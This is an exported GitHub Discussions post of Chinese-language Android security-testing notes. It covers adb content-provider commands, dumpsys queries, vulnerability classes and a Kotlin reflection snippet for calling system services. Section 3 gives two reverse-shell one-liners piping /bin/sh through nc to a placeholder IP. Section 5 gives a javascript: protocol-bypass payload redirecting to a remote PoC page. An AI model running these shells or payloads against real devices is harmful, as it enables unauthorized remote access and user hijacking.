{'date': '2024-11-20 11:03:54', 'nodes': [{'title': '小知识', 'number': 1, 'url': 'https://github.com/CloveIso/notes/discussions/1', 'createdAt': '2024-11-19T06:47:56Z', 'lastEditedAt': '2024-11-20T02:49:20Z', 'updatedAt': '2024-11-20T02:49:20Z', 'body': '1、应用对应的uid  /data/system/packages.list\r\n\r\n2、adb操作provider\r\n\r\n```\r\ncontent query --uri content://icc/adn \r\ncontent delete --uri content://settings/settings/pointer_speed\r\ncontent insert --uri content://settings/settings --bind name:s:my_number --bind value:i:2\r\n```\r\n\r\n3、android 反弹shell\r\n\r\n```\r\nrm /data/local/tmp/f;mkfifo /data/local/tmp/f;cat /data/local/tmp/f|/bin/sh -i 2>&1|nc ip 2222 >/data/local/tmp/f\r\nnc ip 2222|/bin/sh|nc ip 6666\r\n```\r\n\r\n4、查看进程状态和uid状态\r\n\r\n```\r\ndumpsys activity processes | grep UidRecord -C 2\r\n```\r\n\r\n5、协议绕过\r\n\r\njavascript://www.baidu.com/%0D%0Awindow.location.href=\'http://ip/js_poc.html\'\r\n\r\n6、android漏洞总结\r\n\r\n```\r\n1、activity\r\n越权绕过、钓鱼欺诈/Activity劫持、隐式启动Intent包含敏感数据、拒绝服务攻击、intent重定向\r\n2、service\r\n权限提升漏洞、service劫持、消息伪造、拒绝服务攻击\r\n3、broadcast reciver\r\n敏感信息泄漏漏洞、权限绕过漏洞、消息伪造、拒绝服务\r\n4、provider\r\n信息泄露、sql注入、目录遍历\r\n\r\n```\r\n\r\n7、调用系统服务\r\n\r\n```kotlin\r\ntry {\r\n    val getServiceMethod = Class.forName("android.os.ServiceManager").getMethod(\r\n        "getService",\r\n        String::class.java\r\n    )\r\n    val binder = getServiceMethod(null, "companiondevice") as IBinder\r\n    val clsStub = Class.forName("android.companion.ICompanionDeviceManager\\$Stub")\r\n    val asInterfaceMethod = clsStub.getDeclaredMethod("asInterface", IBinder::class.java)\r\n    val service = asInterfaceMethod(null, binder)\r\n    val clsProxy = Class.forName("IService\\$Stub\\$Proxy")\r\n    val testMethod = clsProxy.getDeclaredMethod(\r\n        "MethodName", // change the method name\r\n        Float::class.java, Int::class.java, Long::class.java, Long::class.java // method args\r\n    )\r\n    testMethod(service, 10)\r\n} catch (e: Exception) {\r\n    e.printStackTrace()\r\n}\r\n```\r\n\r\n8、查看权限等级\r\n\r\n```\r\npm list permissions -f (经常报错)\r\ndumpsys package | grep -F "Permission [android.permission.DEVICE_POWER]" -C 3\r\n```\r\n\r\n', 'bodyText': '1、应用对应的uid  /data/system/packages.list\n2、adb操作provider\ncontent query --uri content://icc/adn \ncontent delete --uri content://settings/settings/pointer_speed\ncontent insert --uri content://settings/settings --bind name:s:my_number --bind value:i:2\n\n3、android 反弹shell\nrm /data/local/tmp/f;mkfifo /data/local/tmp/f;cat /data/local/tmp/f|/bin/sh -i 2>&1|nc ip 2222 >/data/local/tmp/f\nnc ip 2222|/bin/sh|nc ip 6666\n\n4、查看进程状态和uid状态\ndumpsys activity processes | grep UidRecord -C 2\n\n5、协议绕过\njavascript://www.baidu.com/%0D%0Awindow.location.href=\'http://ip/js_poc.html\'\n6、android漏洞总结\n1、activity\n越权绕过、钓鱼欺诈/Activity劫持、隐式启动Intent包含敏感数据、拒绝服务攻击、intent重定向\n2、service\n权限提升漏洞、service劫持、消息伪造、拒绝服务攻击\n3、broadcast reciver\n敏感信息泄漏漏洞、权限绕过漏洞、消息伪造、拒绝服务\n4、provider\n信息泄露、sql注入、目录遍历\n\n\n7、调用系统服务\ntry {\n    val getServiceMethod = Class.forName("android.os.ServiceManager").getMethod(\n        "getService",\n        String::class.java\n    )\n    val binder = getServiceMethod(null, "companiondevice") as IBinder\n    val clsStub = Class.forName("android.companion.ICompanionDeviceManager\\$Stub")\n    val asInterfaceMethod = clsStub.getDeclaredMethod("asInterface", IBinder::class.java)\n    val service = asInterfaceMethod(null, binder)\n    val clsProxy = Class.forName("IService\\$Stub\\$Proxy")\n    val testMethod = clsProxy.getDeclaredMethod(\n        "MethodName", // change the method name\n        Float::class.java, Int::class.java, Long::class.java, Long::class.java // method args\n    )\n    testMethod(service, 10)\n} catch (e: Exception) {\n    e.printStackTrace()\n}\n8、查看权限等级\npm list permissions -f (经常报错)\ndumpsys package | grep -F "Permission [android.permission.DEVICE_POWER]" -C 3', 'author': {'login': 'CloveIso'}, 'category': {'name': '01-博客'}, 'labels': {'nodes': []}, 'comments': {'nodes': []}}]}